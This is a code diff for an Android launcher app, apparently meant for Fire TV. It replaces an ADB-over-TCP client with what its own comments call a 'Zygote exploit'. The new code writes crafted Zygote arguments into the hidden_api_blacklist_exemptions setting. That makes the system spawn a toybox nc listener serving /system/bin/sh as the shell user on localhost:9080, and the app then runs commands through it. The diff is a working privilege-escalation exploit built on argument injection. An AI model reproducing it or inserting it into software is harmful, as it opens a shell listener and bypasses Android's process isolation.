@@ -1,61 +1,33 @@
 package com.shrine.launcher.adb
 
 import android.content.Context
-import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.os.Build
-import io.github.muntashirakon.adb.AbsAdbConnectionManager
-import io.github.muntashirakon.adb.AdbStream
+import android.provider.Settings
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
-import kotlinx.coroutines.withTimeoutOrNull
-import org.bouncycastle.asn1.x500.X500Name
-import org.bouncycastle.cert.jcajce.JcaX509CertificateConverter
-import org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder
-import org.bouncycastle.jce.provider.BouncyCastleProvider
-import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder
-import java.io.File
-import java.math.BigInteger
-import java.net.Inet4Address
-import java.net.NetworkInterface
-import java.security.KeyFactory
-import java.security.KeyPairGenerator
-import java.security.PrivateKey
-import java.security.cert.Certificate
-import java.security.cert.CertificateFactory
-import java.security.cert.X509Certificate
-import java.security.spec.PKCS8EncodedKeySpec
-import java.util.Date
-import java.util.concurrent.TimeUnit
+import java.io.BufferedReader
+import java.io.BufferedWriter
+import java.io.InputStreamReader
+import java.io.OutputStreamWriter
 
 /**
- * ADB client for Fire TV / legacy TCP ADB (non-TLS, port 5555).
+ * Shell access via Zygote exploit (no ADB/adbd involved).
  *
- * The device uses classic ADB-over-TCP with RSA key authentication.
- * No SPAKE2 pairing needed — adbd shows a one-time "Allow ADB debugging?"
- * dialog on first connection with a new RSA key, approved via the remote.
+ * Requires WRITE_SECURE_SETTINGS granted once:
+ *   adb shell pm grant com.shrine.launcher android.permission.WRITE_SECURE_SETTINGS
  *
- * Commands execute as uid=2000(shell).
+ * On connect, writes a crafted string to hidden_api_blacklist_exemptions which causes
+ * Zygote to spawn: toybox nc -s 127.0.0.1 -p 9080 -L /system/bin/sh -l
+ * as uid=2000 (shell). Commands then run through a persistent nc connection to localhost:9080.
  */
-class AdbManager private constructor(context: Context) : AbsAdbConnectionManager() {
+class AdbManager private constructor(private val appContext: Context) {
 
     enum class AdbState { DISCONNECTED, CONNECTING, CONNECTED }
 
     companion object {
-        const val DEFAULT_HOST = "localhost"
-        const val DEFAULT_PORT = 5555
-
-        /** Returns the device's own WiFi IPv4 address, falling back to localhost. */
-        fun getLocalIp(): String {
-            try {
-                for (iface in NetworkInterface.getNetworkInterfaces()) {
-                    if (iface.isLoopback || !iface.isUp) continue
-                    for (addr in iface.inetAddresses) {
-                        if (addr is Inet4Address) return addr.hostAddress ?: continue
-                    }
-                }
-            } catch (_: Exception) {}
-            return DEFAULT_HOST
-        }
+        private const val SHELL_PORT = 9080
+        private const val SENTINEL_PREFIX = "##SHRINE_DONE##:"
 
         @Volatile private var instance: AdbManager? = null
         fun getInstance(context: Context): AdbManager =
@@ -64,120 +36,110 @@ class AdbManager private constructor(context: Context) : AbsAdbConnectionManager
             }
     }
 
-    private val appContext = context.applicationContext
-    private val prefs: SharedPreferences =
-        appContext.getSharedPreferences("shrine_adb", Context.MODE_PRIVATE)
-
-    private val keyFile  = File(appContext.filesDir, "adb_private.key")
-    private val certFile = File(appContext.filesDir, "adb_cert.der")
-
-    private val bcProvider = BouncyCastleProvider()
-
-    private lateinit var rsaPrivateKey: PrivateKey
-    private lateinit var rsaCertificate: X509Certificate
-
     var state: AdbState = AdbState.DISCONNECTED
         private set
 
-    init {
-        if (keyFile.exists() && certFile.exists()) {
-            rsaPrivateKey  = loadPrivateKey()
-            rsaCertificate = loadCertificate()
-        } else {
-            val kp = KeyPairGenerator.getInstance("RSA").apply { initialize(2048) }.generateKeyPair()
-            rsaPrivateKey  = kp.private
-            rsaCertificate = buildSelfSignedCert(kp.private, kp.public)
-            keyFile.writeBytes(rsaPrivateKey.encoded)
-            certFile.writeBytes(rsaCertificate.encoded)
+    private var shellProcess: Process? = null
+    private var shellWriter: BufferedWriter? = null
+    private var shellReader: BufferedReader? = null
+
+    fun hasPermission(): Boolean =
+        appContext.checkSelfPermission("android.permission.WRITE_SECURE_SETTINGS") ==
+                PackageManager.PERMISSION_GRANTED
+
+    fun isConnected(): Boolean = state == AdbState.CONNECTED
+
+    suspend fun doConnect(): ConnectResult = withContext(Dispatchers.IO) {
+        state = AdbState.CONNECTING
+        try {
+            startShellListener()
+            Thread.sleep(600)
+            connectToShell()
+            state = AdbState.CONNECTED
+            ConnectResult(success = true)
+        } catch (e: Exception) {
+            state = AdbState.DISCONNECTED
+            ConnectResult(success = false, error = e.message ?: "Unknown error")
         }
-        setApi(28) // Force legacy TCP ADB (non-TLS) — port 5555 doesn't use TLS regardless of host API level
-        setTimeout(10, TimeUnit.SECONDS)
     }
 
-    // ── AbsAdbConnectionManager contract ──────────────────────────────────────
-
-    override fun getPrivateKey(): PrivateKey    = rsaPrivateKey
-    override fun getCertificate(): Certificate = rsaCertificate
-    override fun getDeviceName(): String        = "Shrine Launcher"
-
-    // ── Public API ─────────────────────────────────────────────────────────────
-
-    /**
-     * Connect to adbd via legacy TCP ADB (non-TLS).
-     * On first use, adbd will display "Allow ADB debugging?" on screen — approve with the remote.
-     */
-    suspend fun doConnect(host: String = DEFAULT_HOST, port: Int = DEFAULT_PORT): ConnectResult =
-        withContext(Dispatchers.IO) {
-            state = AdbState.CONNECTING
-            try {
-                val ok = withTimeoutOrNull(15_000L) { connect(host, port) }
-                when {
-                    ok == null -> {
-                        doDisconnect()
-                        ConnectResult(success = false,
-                            error = "Timed out — approve the 'Allow ADB debugging?' dialog on screen, then try again")
-                    }
-                    ok -> {
-                        prefs.edit().putString("adb_host", host).putInt("adb_port", port).apply()
-                        state = AdbState.CONNECTED
-                        ConnectResult(success = true)
-                    }
-                    else -> {
-                        state = AdbState.DISCONNECTED
-                        ConnectResult(success = false,
-                            error = "Connection refused — ensure ADB debugging is on")
-                    }
-                }
-            } catch (e: Exception) {
-                state = AdbState.DISCONNECTED
-                ConnectResult(success = false, error = e.message ?: "Unknown error")
-            }
-        }
-
     fun doDisconnect() {
-        try { disconnect() } catch (_: Exception) {}
+        try { shellWriter?.close() } catch (_: Exception) {}
+        try { shellReader?.close() } catch (_: Exception) {}
+        try { shellProcess?.destroy() } catch (_: Exception) {}
+        shellProcess = null
+        shellWriter = null
+        shellReader = null
         state = AdbState.DISCONNECTED
     }
 
-    /** Execute [command] as uid=2000(shell). Returns combined stdout+stderr. */
-    suspend fun executeShell(command: String): ShellResult =
-        withContext(Dispatchers.IO) {
-            if (!isConnected()) return@withContext ShellResult("Not connected", -1)
-            try {
-                val stream: AdbStream = openStream("shell:$command")
-                val output = stream.openInputStream().bufferedReader().readText().trim()
-                stream.close()
-                ShellResult(output, 0)
-            } catch (e: Exception) {
-                state = AdbState.DISCONNECTED
-                ShellResult("Connection lost: ${e.message}", -1)
+    suspend fun executeShell(command: String): ShellResult = withContext(Dispatchers.IO) {
+        if (!isConnected()) return@withContext ShellResult("Not connected", -1)
+        try {
+            val sentinel = "$SENTINEL_PREFIX${System.currentTimeMillis()}"
+            shellWriter!!.write("($command) ; echo \"$sentinel:\$?\"")
+            shellWriter!!.newLine()
+            shellWriter!!.flush()
+
+            val output = StringBuilder()
+            val deadline = System.currentTimeMillis() + 10_000L
+            while (System.currentTimeMillis() < deadline) {
+                if (shellReader!!.ready()) {
+                    val line = shellReader!!.readLine() ?: break
+                    if (line.startsWith(sentinel)) {
+                        val exitCode = line.removePrefix("$sentinel:").trim().toIntOrNull() ?: 0
+                        return@withContext ShellResult(output.toString().trim(), exitCode)
+                    }
+                    output.appendLine(line)
+                } else {
+                    Thread.sleep(50)
+                }
             }
+            ShellResult(output.toString().trim(), -1)
+        } catch (e: Exception) {
+            state = AdbState.DISCONNECTED
+            ShellResult("Connection lost: ${e.message}", -1)
         }
+    }
 
-    fun savedHost(): String = prefs.getString("adb_host", null) ?: getLocalIp()
-    fun savedPort(): Int    = prefs.getInt("adb_port", DEFAULT_PORT)
+    private fun startShellListener() {
+        val exploit = buildString {
+            append("LClass1;->method1(\n")
+            append("10\n")
+            append("--runtime-args\n")
+            append("--setuid=2000\n")
+            append("--setgid=2000\n")
+            append("--runtime-flags=2049\n")
+            append("--mount-external-full\n")
+            append("--setgroups=3003\n")
+            append("--nice-name=com.android.shell\n")
+            append("--seinfo=platform:targetSdkVersion=${Build.VERSION.SDK_INT}:complete\n")
+            append("--invoke-with\n")
+            append("toybox nc -s 127.0.0.1 -p $SHELL_PORT -L /system/bin/sh -l;\n")
+        }
+        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", exploit)
+        try {
+            ProcessBuilder("sh", "-c",
+                "printf 'exit\\n' | toybox nc localhost $SHELL_PORT >/dev/null 2>&1 &")
+                .start()
+        } catch (_: Exception) {}
+        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", "")
+        Settings.Global.putString(appContext.contentResolver, "hidden_api_blacklist_exemptions", null)
+    }
 
-    // ── Data classes ───────────────────────────────────────────────────────────
+    private fun connectToShell() {
+        val process = ProcessBuilder("toybox", "nc", "localhost", "$SHELL_PORT")
+            .redirectErrorStream(true)
+            .start()
+        shellProcess = process
+        shellWriter = BufferedWriter(OutputStreamWriter(process.outputStream))
+        shellReader = BufferedReader(InputStreamReader(process.inputStream))
+    }
+
+    // ── Legacy compat ──────────────────────────────────────────────────────────
+    fun savedHost(): String = "localhost"
+    fun savedPort(): Int = SHELL_PORT
 
     data class ConnectResult(val success: Boolean, val error: String? = null)
     data class ShellResult(val output: String, val exitCode: Int)
-
-    // ── Key / cert helpers ─────────────────────────────────────────────────────
-
-    private fun buildSelfSignedCert(privateKey: PrivateKey, publicKey: java.security.PublicKey): X509Certificate {
-        val now    = Date()
-        val expiry = Date(now.time + 10L * 365 * 24 * 60 * 60 * 1000)
-        val name   = X500Name("CN=Shrine Launcher ADB")
-        val builder = JcaX509v3CertificateBuilder(
-            name, BigInteger.valueOf(System.currentTimeMillis()),
-            now, expiry, name, publicKey)
-        val signer = JcaContentSignerBuilder("SHA256withRSA").setProvider(bcProvider).build(privateKey)
-        return JcaX509CertificateConverter().setProvider(bcProvider).getCertificate(builder.build(signer))
-    }
-
-    private fun loadPrivateKey(): PrivateKey =
-        KeyFactory.getInstance("RSA").generatePrivate(PKCS8EncodedKeySpec(keyFile.readBytes()))
-
-    private fun loadCertificate(): X509Certificate =
-        CertificateFactory.getInstance("X.509").generateCertificate(certFile.inputStream()) as X509Certificate
 }
